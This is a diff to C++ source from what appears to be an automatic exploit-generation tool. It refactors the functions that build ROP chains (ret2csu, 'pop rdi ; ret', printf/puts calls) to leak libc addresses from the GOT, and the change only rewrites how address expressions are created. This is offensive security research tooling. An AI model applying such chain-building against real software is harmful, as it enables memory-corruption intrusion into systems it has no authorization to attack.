@@ -104,8 +104,6 @@ std::vector<RopSubchain> GotLeakLibc::getRopSubchains() const {
 
 std::vector<RopSubchain>
 GotLeakLibc::getRopSubchainsForPrintf(const std::string &targetSym) const {
-    using BaseType = BaseOffsetExpr::BaseType;
-
     Exploit &exploit = g_crax->getExploit();
     const ELF &elf = exploit.getElf();
 
@@ -121,7 +119,7 @@ GotLeakLibc::getRopSubchainsForPrintf(const std::string &targetSym) const {
     RopSubchain part1 = ret2csu->getRopSubchains(
         BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
         ConstantExpr::create(0, Expr::Int64),
-        BaseOffsetExpr::create(exploit, elf, "got_leak_libc_fmt_str"),
+        BaseOffsetExpr::create<BaseType::VAR>(elf, "got_leak_libc_fmt_str"),
         ConstantExpr::create(fmtStr.size(), Expr::Int64))[0];
 
     // read(0, 0, 0), setting RAX to 0 and RDI to 1.
@@ -133,13 +131,13 @@ GotLeakLibc::getRopSubchainsForPrintf(const std::string &targetSym) const {
 
     // Set RSI to elf.got['read'], returning to `pop rdi ; ret`.
     RopSubchain part3 = ret2csu->getRopSubchains(
-        BaseOffsetExpr::create(exploit, elf, Exploit::toVarName("pop rdi ; ret")),
+        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName("pop rdi ; ret")),
         ConstantExpr::create(0, Expr::Int64),
         BaseOffsetExpr::create<BaseType::GOT>(elf, targetSym),
         ConstantExpr::create(0, Expr::Int64))[0];
 
     RopSubchain part4 = {
-        BaseOffsetExpr::create(exploit, elf, "got_leak_libc_fmt_str"),
+        BaseOffsetExpr::create<BaseType::VAR>(elf, "got_leak_libc_fmt_str"),
         BaseOffsetExpr::create<BaseType::SYM>(elf, "printf")
     };
 
@@ -172,8 +170,6 @@ GotLeakLibc::getRopSubchainsForPrintf(const std::string &targetSym) const {
 
 std::vector<RopSubchain>
 GotLeakLibc::getRopSubchainsForPuts(const std::string &targetSym) const {
-    using BaseType = BaseOffsetExpr::BaseType;
-
     Exploit &exploit = g_crax->getExploit();
     const ELF &elf = exploit.getElf();
 
@@ -181,7 +177,7 @@ GotLeakLibc::getRopSubchainsForPuts(const std::string &targetSym) const {
     assert(ret2csu);
 
     RopSubchain part1 = {
-        BaseOffsetExpr::create(exploit, elf, Exploit::toVarName("pop rdi ; ret")),
+        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName("pop rdi ; ret")),
         BaseOffsetExpr::create<BaseType::GOT>(elf, targetSym),
         BaseOffsetExpr::create<BaseType::SYM>(elf, "puts")
     };
